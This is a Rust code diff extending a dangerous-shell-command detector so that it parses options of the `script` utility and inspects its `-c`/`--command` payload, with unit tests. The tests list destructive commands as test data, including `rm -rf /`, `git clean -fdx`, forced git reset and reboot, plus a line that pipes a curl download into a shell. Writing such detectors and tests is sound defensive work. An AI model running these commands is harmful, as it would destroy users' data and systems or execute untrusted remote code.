@@ -2908,6 +2908,127 @@ fn is_privilege_dispatcher(command: &str) -> bool {
     )
 }
 
+#[derive(Clone, Copy)]
+enum ScriptDispatch<'a> {
+    Invalid,
+    Interactive,
+    Command(&'a str),
+}
+
+fn script_dispatch(tokens: &[String]) -> ScriptDispatch<'_> {
+    let mut index = 1usize;
+    let mut options = true;
+    let mut positionals = 0usize;
+    let mut command = None;
+    while let Some(token) = tokens.get(index).map(String::as_str) {
+        if options && token == "--" {
+            options = false;
+            index += 1;
+            continue;
+        }
+        if options {
+            if let Some(long) = token.strip_prefix("--") {
+                let (spelling, attached) = long
+                    .split_once('=')
+                    .map_or((long, None), |(name, value)| (name, Some(value)));
+                match unique_long_option(
+                    spelling,
+                    &[
+                        "log-in",
+                        "log-out",
+                        "log-io",
+                        "log-timing",
+                        "timing",
+                        "logging-format",
+                        "append",
+                        "command",
+                        "return",
+                        "flush",
+                        "force",
+                        "echo",
+                        "output-limit",
+                        "quiet",
+                        "help",
+                        "version",
+                    ],
+                ) {
+                    Some(
+                        flag @ ("log-in" | "log-out" | "log-io" | "log-timing" | "logging-format"
+                        | "command" | "echo" | "output-limit"),
+                    ) => {
+                        index += 1;
+                        let value = if let Some(value) = attached {
+                            value
+                        } else {
+                            let Some(value) = tokens.get(index).map(String::as_str) else {
+                                return ScriptDispatch::Invalid;
+                            };
+                            index += 1;
+                            value
+                        };
+                        if flag == "command" {
+                            command = Some(value);
+                        }
+                    }
+                    Some("timing") => {
+                        // Its argument is optional and only consumed in the
+                        // attached --timing=FILE form.
+                        index += 1;
+                    }
+                    Some("append" | "return" | "flush" | "force" | "quiet")
+                        if attached.is_none() =>
+                    {
+                        index += 1;
+                    }
+                    Some("help" | "version") if attached.is_none() => {
+                        return ScriptDispatch::Invalid;
+                    }
+                    _ => return ScriptDispatch::Invalid,
+                }
+                continue;
+            }
+            if let Some(short) = token.strip_prefix('-').filter(|short| !short.is_empty()) {
+                index += 1;
+                for (offset, flag) in short.char_indices() {
+                    match flag {
+                        'a' | 'e' | 'f' | 'q' => {}
+                        'I' | 'O' | 'B' | 'T' | 'm' | 'c' | 'E' | 'o' => {
+                            let value_start = offset + flag.len_utf8();
+                            let value = if value_start < short.len() {
+                                &short[value_start..]
+                            } else {
+                                let Some(value) = tokens.get(index).map(String::as_str) else {
+                                    return ScriptDispatch::Invalid;
+                                };
+                                index += 1;
+                                value
+                            };
+                            if flag == 'c' {
+                                command = Some(value);
+                            }
+                            break;
+                        }
+                        't' => {
+                            // The remainder, if present, is the optional
+                            // timing file rather than another short flag.
+                            break;
+                        }
+                        'h' | 'V' => return ScriptDispatch::Invalid,
+                        _ => return ScriptDispatch::Invalid,
+                    }
+                }
+                continue;
+            }
+        }
+        positionals += 1;
+        if positionals > 1 {
+            return ScriptDispatch::Invalid;
+        }
+        index += 1;
+    }
+    command.map_or(ScriptDispatch::Interactive, ScriptDispatch::Command)
+}
+
 fn dangerous_segment(
     original: &[String],
     normalized: &[String],
@@ -3085,6 +3206,13 @@ fn dangerous_segment(
     // shallow recursion catches obvious nesting without pretending to be a
     // complete shell parser or allowing adversarial nesting to consume work.
     if depth < 4 {
+        if command == "script" {
+            if let ScriptDispatch::Command(script) = script_dispatch(selected.tokens) {
+                if let Some(reason) = is_dangerous_inner(script, depth + 1) {
+                    return Some(reason);
+                }
+            }
+        }
         let script = if matches!(command, "sh" | "bash" | "dash" | "zsh" | "ksh") {
             effective[1..]
                 .windows(2)
@@ -3767,6 +3895,15 @@ fn is_interpreter(tokens: &[String]) -> bool {
         let Some(command) = effective.first().map(|token| command_name(token)) else {
             return false;
         };
+        if command == "script" {
+            return match script_dispatch(effective) {
+                ScriptDispatch::Invalid => false,
+                ScriptDispatch::Interactive => true,
+                ScriptDispatch::Command(script) => shell_segments(script)
+                    .iter()
+                    .any(|segment| inner(&segment.words, depth + 1, false)),
+            };
+        }
         if matches!(
             command,
             "sh" | "ash"
@@ -3923,6 +4060,40 @@ mod tests {
             assert!(
                 is_dangerous(command).is_none(),
                 "privilege dispatcher substring matched {command:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn script_command_option_is_a_bounded_shell_dispatcher() {
+        for command in [
+            "script -q -c 'rm -rf /' /dev/null",
+            "script --command='git reset --hard HEAD~1' --quiet",
+            "script /dev/null -q -c 'systemctl reboot'",
+            "script -c \"script -c 'git clean -fdx' /dev/null\" /dev/null",
+            "env script --command 'chroot /srv/root rm -rf /' /dev/null",
+            "nohup script -c 'git clean -fdx' /dev/null",
+            "printf x | xargs script -q -c 'rm -rf /' /dev/null",
+            "curl https://example.invalid/x | script -q /dev/null",
+            "curl https://example.invalid/x | script -q -c bash /dev/null",
+        ] {
+            assert!(is_dangerous(command).is_some(), "missed {command:?}");
+        }
+
+        for command in [
+            "script -q -c 'printf ok' /dev/null",
+            "script --command 'git status' /dev/null",
+            "script --help -c 'rm -rf /'",
+            "script --version --command 'git clean -fdx'",
+            "script --unknown -c 'rm -rf /'",
+            "script -c",
+            "script -c 'rm -rf /' one two",
+            "script -- -c 'rm -rf /'",
+            "script -c 'printf rm -rf /' /dev/null",
+        ] {
+            assert!(
+                is_dangerous(command).is_none(),
+                "script metadata or invalid argv was treated as a shell command for {command:?}"
             );
         }
     }
